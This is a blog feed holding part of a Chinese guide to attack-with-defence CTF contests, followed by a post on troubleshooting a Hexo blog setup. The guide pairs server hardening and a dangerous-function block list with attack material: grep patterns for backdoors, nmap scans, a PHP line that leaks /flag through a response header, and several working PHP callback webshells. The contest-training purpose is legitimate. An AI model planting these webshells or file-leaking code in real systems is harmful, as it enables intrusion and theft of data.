<code>secure_file_priv=&quot;&quot;</code></p>\n<p>重载 MySQL 配置<br />\n <code>FLUSH PRIVILEGES</code> <br />\n 重启 MySQL 服务</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mysql restart</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart mysql</pre></td></tr></table></figure><h2 id=\"web加固\"><a class=\"anchor\" href=\"#web加固\">#</a> web 加固</h2>\n<h3 id=\"设置权限\"><a class=\"anchor\" href=\"#设置权限\">#</a> 设置权限</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html/*.php <span class=\"token comment\"># php 文件需要执行权限</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">chmod</span> 0555 /var/www/html       <span class=\"token comment\"># Web 根目录设置只读和执行权限</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">chmod</span> <span class=\"token parameter variable\">-R</span> <span class=\"token number\">644</span> /var/www          <span class=\"token comment\"># -R 递归设置</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 改变文件的属主和属组来设置严格的权限</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> root:root /var/www/html/  <span class=\"token comment\"># 设置拥有人为 root:root 或 httpd:httpd</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> apache:apache /var/www/html/ <span class=\"token comment\"># 确保 apache 拥有 /var/www/html/</span></pre></td></tr></table></figure><h3 id=\"网站备份\"><a class=\"anchor\" href=\"#网站备份\">#</a> 网站备份</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-cvf</span> web.tar /var/www/html</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">zip</span> <span class=\"token parameter variable\">-q</span> <span class=\"token parameter variable\">-r</span> web.zip /var/www/html</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 压缩源码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xvf</span> web.tar <span class=\"token parameter variable\">-c</span> /var/www/html</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">unzip</span> web.zip <span class=\"token parameter variable\">-d</span> /var/www/html</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 解压缩源码</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">mv</span> web.zip /home/xxx</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 一定要移动不然源码泄露  </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">scp</span> username@servername:/path/filename /tmp/local_destination  <span class=\"token comment\"># 从服务器下载单个文件到本地</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">scp</span> /path/local_filename username@servername:/path             <span class=\"token comment\"># 从本地上传单个文件到服务器</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> username@servername:remote_dir/ /tmp/local_dir          <span class=\"token comment\"># 从服务器下载整个目录到本地</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> /tmp/local_dir username@servername:remote_dir           <span class=\"token comment\"># 从本地上传整个目录到服务器</span></pre></td></tr></table></figure><h3 id=\"日志记录\"><a class=\"anchor\" href=\"#日志记录\">#</a> 日志记录</h3>\n<p><strong>python 文件监控脚本，<a href=\"\">传送门</a></strong></p>\n<blockquote>\n<p>/var/log/nginx/    #默认 Nginx 日志目录<br />\n /var/log/apache/   #默认 Apache 日志目录<br />\n /var/log/apache2/  #默认 Apache 日志目录<br />\n /usr/local/tomcat/logs #Tomcat 日志目录<br />\n tail -f xxx.log   #实时刷新滚动日志文件</p>\n</blockquote>\n<h3 id=\"设置htaccess禁用php脚本执行\"><a class=\"anchor\" href=\"#设置htaccess禁用php脚本执行\">#</a> 设置.htaccess 禁用 php 脚本执行</h3>\n<details open>\n<summary><span class=\"pre-summary\">&nbsp;</span>👇<strong>脚本点击展开</strong></summary><p>&lt;Directory &quot;/var/www/html/upload&quot;&gt;   // 指定目录后续的指令将应用于该目录<br />\n Options -ExecCGI -Indexes            // 禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。<br />\nAllowOverride None                   // 不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。<br />\nRemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml<br />\nRemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml<br />\n// 这两个指令移除指定文件扩展名的处理器和类型。<br />\n// 在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。<br />\nphp_flag engine off     // 这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。<br />\n&lt;FilesMatch &quot;.+.ph(p[3457]?|t|tml)$&quot;&gt;<br />\ndeny from all<br />\n&lt;/FilesMatch&gt;  // 这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有<br />\n &lt;/Directory&gt;+++</p>\n<h3 id=\"php参数安全配置\"><a class=\"anchor\" href=\"#php参数安全配置\">#</a> php 参数安全配置</h3>\n<p>在 <code>/etc/php7.2.1/php.ini</code>  下</p>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><strong>禁用高危函数</strong></p>\n</li>\n</ul>\n<pre><code>disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_Tupungato,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname\n</code></pre>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><strong>配置 open_basedir</strong> （将用户访问文件的活动范围限制在指定的区域）</p>\n</li>\n</ul>\n<pre><code>open_basedir=/var/www/html\n</code></pre>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><strong>禁用魔术引号</strong>（自动对外部来源数据进行转义，防止 SQL 注入）</p>\n</li>\n</ul>\n<pre><code>magic_quotes_gpc = Off\n</code></pre>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><strong>关闭 PHP 伪协议</strong></p>\n</li>\n</ul>\n<pre><code>allow_url_fopen = Off\nallow_url_include = Off\n</code></pre>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><strong>重启 PHP</strong></p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> php7.0-fpm restart</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart php7.0-fpm.service</pre></td></tr></table></figure><h3 id=\"waf部署\"><a class=\"anchor\" href=\"#waf部署\">#</a> waf 部署</h3>\n<p><a href=\"\">脚本传送门</a><br />\n php.ini 选项：auto_prepend_file = 与 auto_append_file =waf.php</p>\n<blockquote>\n<p>waf 脚本，<a href=\"https://github.com/sharpleung/CTF-WAF\">项目戳这里</a>，<a href=\"http://t.csdnimg.cn/y4KoJ\"> 部署看这里</a><br />\n WatchBrid 通防不允许用于比赛，第三方通防参考比赛规则<br />\n<a href=\"https://github.com/DasSecurity-HatLab/AoiAWD\"> AoiAWD 戳这里</a><br />\n<a href=\"https://www.freebuf.com/sectool/234402.html\"> WatchBrid 防火墙戳这里</a></p>\n</blockquote>\n<h3 id=\"php代码审计\"><a class=\"anchor\" href=\"#php代码审计\">#</a> php 代码审计</h3>\n<p>扫描预留后门，扫描目录，寻找后门，注释代码<br />\n cms 框架的 cve、常见的漏洞等</p>\n<div class=\"note success\">\n<p>这部分需要进攻防守同时进行，审计出漏洞后分工，一人补 waf、注释代码，一人写脚本、写 payload<br />\n 具体放在 attack 部分讲解。</p>\n</div>\n<h3 id=\"远程登录加固\"><a class=\"anchor\" href=\"#远程登录加固\">#</a> 远程登录加固</h3>\n<p>暂时用不到，遇到再补充</p>\n<h3 id=\"设置禁ping\"><a class=\"anchor\" href=\"#设置禁ping\">#</a> 设置禁 Ping</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"1\"</span> <span class=\"token operator\">></span> /proc/sys/net/ipv4/icmp_echo_ignore_all     //临时开启禁ping</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"0\"</span> <span class=\"token operator\">></span> /proc/sys/net/ipv4/icmp_echo_ignore_all     //关闭禁ping</pre></td></tr></table></figure><h1 id=\"进攻attack\"><a class=\"anchor\" href=\"#进攻attack\">#</a> 进攻（attack）</h1>\n<blockquote>\n<p>一定要在前几轮脚本批量获取分数，到后面基本上是打卡下班了</p>\n</blockquote>\n<h2 id=\"代码审计\"><a class=\"anchor\" href=\"#代码审计\">#</a> 代码审计</h2>\n<p>:::waring<br />\n 各个靶机服务相同，可以先在主机代码审计，寻找简单漏洞。由易到难。<br />\n:::<br />\n 扫描预留后门，扫描目录，寻找后门，注释代码</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 简单的查找后门 （不建议）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'eval('</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'assert('</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'system('</span></pre></td></tr></table></figure><p><span class=\"red\"><strong>推荐</strong></span><br />\n打开 D 盾 / 安全狗 / 河马查杀，将 html 文件夹直接拖入</p>\n<p>seay 源代码审计，或者 Rips 代码审计<br />\n<a href=\"https://blog.csdn.net/qq_43442524/article/details/101934481\">工具</a></p>\n<h2 id=\"metasploit工具\"><a class=\"anchor\" href=\"#metasploit工具\">#</a> Metasploit 工具</h2>\n<p><a href=\"\">插个眼</a></p>\n<h2 id=\"nmap扫描工具\"><a class=\"anchor\" href=\"#nmap扫描工具\">#</a> nmap 扫描工具</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> ip/子网掩码</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nmap <span class=\"token parameter variable\">-sS</span> -p- <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>  <span class=\"token comment\"># 扫描主机所有端口</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nmap <span class=\"token parameter variable\">-Pn</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token parameter variable\">-A</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span></pre></td></tr></table></figure><p>这里放一些常用的 nmap 命令，更多需求<a href=\"\">插个眼</a></p>\n<blockquote>\n<p>学会读官方说明文档真的很重要，比起直接看别人写好的教程，会对工具的用法有更深的理解。<a href=\"https://nmap.org/man/zh/index.html\">nmap 中文文档</a></p>\n</blockquote>\n<h2 id=\"权限维持\"><a class=\"anchor\" href=\"#权限维持\">#</a> 权限维持</h2>\n<p>拿到 WEBSHELL 后，需要维持权限！简单的 WEBSHELL 一眼就会被识别，在 AWD 中优先考虑种不死马、反弹 SHELL 等留后门方式维持权限，以便后续刷 FLAG，再考虑提升权限。</p>\n<h3 id=\"关于反弹shell\"><a class=\"anchor\" href=\"#关于反弹shell\">#</a> 关于反弹 shell</h3>\n<p>怎么写怎么藏怎么发现，买了服务器再学 hhhhh🥱🥱</p>\n<h3 id=\"藏flag技术哪家强\"><a class=\"anchor\" href=\"#藏flag技术哪家强\">#</a> 藏 flag 技术哪家强</h3>\n<div class=\"note warning\">\n<p>第一次 getshell 之后不能得意，权限的维持时间有限，如果能把 flag 藏在某处持续得分才是大头任务</p>\n</div>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag:'</span><span class=\"token operator\">.</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>条件允许的话，将 flag 信息直接读取并返回到 header 头中，这样做不易被发现。</p>\n<h3 id=\"藏后门的n种方式\"><a class=\"anchor\" href=\"#藏后门的n种方式\">#</a> 藏后门的 n 种方式</h3>\n<p>直接放上 p 神的文章，膜拜一下</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html\">创造 tips 的秘籍 ——PHP 回调后门 | 离别歌 (leavesongs.com)</a></p>\n<details open>\n<summary><span class=\"pre-summary\">&nbsp;</span>👇整理了一下后门的脚本 蓝色</summary><p>文章发布自 2015 年，目前各大 waf 都有了修补，参考着使用吧，脚本只做搬运，认真拜读</p>\n<p><mark>单参数后门的终极奥义</mark></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">register_shutdown_function</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">declare</span><span class=\"token punctuation\">(</span>ticks<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">register_tick_function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">filter_var</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILTER_CALLBACK</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'options'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'assert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">filter_var_array</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'filter'</span> <span class=\"token operator\">=></span> <span class=\"token constant\">FILTER_CALLBACK</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'options'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'assert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>过去那么久了，php 也到了 8.1 的版本，后续有空测试一下这些后门还能用不 +++</p>\n<h4 id=\"关于不死马\"><a class=\"anchor\" href=\"#关于不死马\">#</a> 关于不死马</h4>\n<p><a href=\"\">传送门</a></p>\n<p>不死马可以权限维持，并且继续往服务器写入更多的马，不要仅限于 getflag</p>\n<h1 id=\"一些批量脚本\"><a class=\"anchor\" href=\"#一些批量脚本\">#</a> 一些批量脚本</h1>\n<hr />\n<h1 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章：</h1>\n<p><a href=\"https://forum.butian.net/share/2536\">https://forum.butian.net/share/2536</a><br />\n<a href=\"https://www.cnblogs.com/qianfu/p/17530955.html\">https://www.cnblogs.com/qianfu/p/17530955.html</a><br />\n<a href=\"http://t.csdnimg.cn/7nF7a\">http://t.csdnimg.cn/7nF7a</a><br />\n<a href=\"https://www.cnblogs.com/liang2580/p/9147806.html\">https://www.cnblogs.com/liang2580/p/9147806.html</a><br />\n<a href=\"https://github.com/AabyssZG/AWD-Guide\">https://github.com/AabyssZG/AWD-Guide</a><br />\n<a href=\"http://t.csdnimg.cn/ucKKL\">http://t.csdnimg.cn/ucKKL</a></p>\n</details>\n</details>\n",
            "tags": [
                "AWD",
                "kali tools",
                "Attack and Defence"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/",
            "url": "https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/",
            "title": "搭博客一路的心酸",
            "date_published": "2024-04-10T03:50:46.000Z",
            "content_html": "<p>一开始一眼相中了 shoka 主题的样式，谁料到后来搬石头砸了自己的脚。<br />\n部署到一半发现 shoka 有了升级版 shokaX，只得重新来过<br />\n随后 <code>npm install</code>  反复报错，真是头大<br />\n在配置图片时候又发现用 images.yml 的相对路径加载不到。<br />\n换了图床后 images.yml 也没加载成功……😑😰</p>\n<h1 id=\"傻掉的是我不是git-bash\"><a class=\"anchor\" href=\"#傻掉的是我不是git-bash\">#</a> 傻掉的是我，不是 git bash</h1>\n<p>第一个拦路虎就是<strong> hexo init</strong><br />\n 卡住了无数次…… 耐心不够用了，都怀疑是不是 git bash 坏掉了<br />\n最后换源再 <code>npm hexo init</code> <br />\n 长舒一口气</p>\n<p>在安装前已经修改了 nodejs 的权限问题</p>\n<h1 id=\"powershell的脚本运行问题\"><a class=\"anchor\" href=\"#powershell的脚本运行问题\">#</a> powershell 的脚本运行问题</h1>\n<p>若直接运行 hexo 会报这样的错误<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-2.png\" alt=\"err\" /></p>\n<p>设置 - 系统 - 开发者选项<br />\n &quot;允许本地 powershell 脚本在未签名的情况下允许&quot; 选择开启<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-1.png\" alt=\"设置-系统-开发者选项\" /></p>\n<h1 id=\"躲不掉的还是npm-err\"><a class=\"anchor\" href=\"#躲不掉的还是npm-err\">#</a> 躲不掉的还是 npm ERR！</h1>\n<p><img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-3.png\" alt=\"&quot;每次npm install时的噩梦&quot;\" title=\"npm ERR! Cannot read properties of null (reading 'matches')\" /><br />\n<strong>npm ERR! Cannot read properties of null (reading 'matches')</strong><br />\n 网上面对这个报错的做法是</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> cache clean <span class=\"token parameter variable\">--force</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或者二傻子GPT说</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> <span class=\"token function\">npm</span></pre></td></tr></table></figure><p>也有的说删除 <code>package-lock.json</code>  删除 <code>node-modules</code>  的，但是没有 lock……<br />\n 尝试了换源，似乎还是没什么卵用……<br />\n 最后用 cnpm 才成功下载……💔</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> cnpm</pre></td></tr></table></figure><p>命令丢这下次好拿 (cnpm 换源的命令相同)</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token path\">npm</span> 官方镜像网址:   https://registry.npmjs.org/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>淘宝 NPM 镜像：     https://registry.npm.taobao.org</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>阿里云 NPM 镜像：   https://npm.aliyun.com</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>腾讯云 NPM 镜像：   https://mirrors.cloud.tencent.com/npm/</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>华为云 NPM 镜像：   https://mirrors.huaweicloud.com/repository/npm/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>网易 NPM 镜像：     https://mirrors.163.com/npm/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>中国科学技术大学开源镜像站：http://mirrors.ustc.edu.cn/</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>清华大学开源镜像站：https://mirrors.tuna.tsinghua.edu.cn/</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>腾讯，华为，阿里的镜像站基本上比较全</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> config <span class=\"token builtin class-name\">set</span> registry <span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 设置镜像仓库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">npm</span> config get registry</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看当前镜像仓库</span></pre></td></tr></table></figure><h1 id=\"相对路径问题\"><a class=\"anchor\" href=\"#相对路径问题\">#</a> 相对路径问题</h1>\n<p>看各路 hexo 教程在说相对路径时候都一脸蒙<br />\n学 Linux 时候相对路径是./ 开头，或者绝对路径根目录 / 开头<br />\n但是教程上谈到发布文章的相对路径都是 / 开头</p>\n<blockquote>\n<p>先看看官网的解释<br />\n相对地址<br />\n默认情况下，Hexo 生成的超链接都是绝对地址。例如，如果您的网站域名为 <a href=\"http://example.com\">example.com</a>，您有一篇文章名为 hello，那么绝对链接可能像这样：&lt;<a href=\"http://example.com/hello.html%5C\">http://example.com/hello.html\\</a>&gt; ，它是绝对于域名的。相对链接像这样：/hello.html，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。</p>\n</blockquote>\n<p>这里相对路径其实指的网站的根目录<br />\n在 hexo g 之后生成的 public 目录会在 hexo d 部署到网站上<br />\n那么相对路径指的就是以 public 目录为起始 /<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-4.png\" alt=\"public文件夹\" /><br />\n如果还是定位不到图片的地址，就把图片和文章放一起 hexo g 之后看 /public 下的位置<br />\n然后就知道图片的地址该怎么写了</p>\n<h1 id=\"imagesyml图片加载不到问题\"><a class=\"anchor\" href=\"#imagesyml图片加载不到问题\">#</a> images.yml 图片加载不到问题</h1>\n<blockquote>\n<p>官方配置文档：<a href=\"https://docs.kaitaku.xyz/guide/theme.html#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E7%AB%99%E8%BD%AE%E6%92%AD%E5%9B%BE\">https://docs.kaitaku.xyz/guide/theme.html# 自定义网站轮播图</a></p>\n</blockquote>\n<p>但是本地测试的时候发现，images.yml 中使用相对路径图片没有加载，于是按照文档说明，分别在</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>主题文件夹下_images_index.yml</p>\n</li>\n<li class=\"lvl-2\">\n<p>source/_data/images_index.yml</p>\n</li>\n</ul>\n<p>这些位置都<strong>没有成功</strong>加载网站背景图片。<br />\n<strong><mark>解决方案</mark></strong><br />\n直接修改 <code>主题文件夹下_images_index.yml</code> ，即 <code>/theme/shohaX/images.yml</code> 。按照官方文档 SXC 的下载方式，主题文件夹在 <code>/node_modules/hexo-theme-shokaX/images.yml</code></p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>source/_data/images.yml</p>\n</li>\n</ul>\n<blockquote>\n<p>心里话：真是给我累吐血了</p>\n</blockquote>\n<h1 id=\"nrm管理\"><a class=\"anchor\" href=\"#nrm管理\">#</a> nrm 管理</h1>\n<p>nrm 是一个 npm 源管理器，允许你快速地在 npm 源间切换</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> 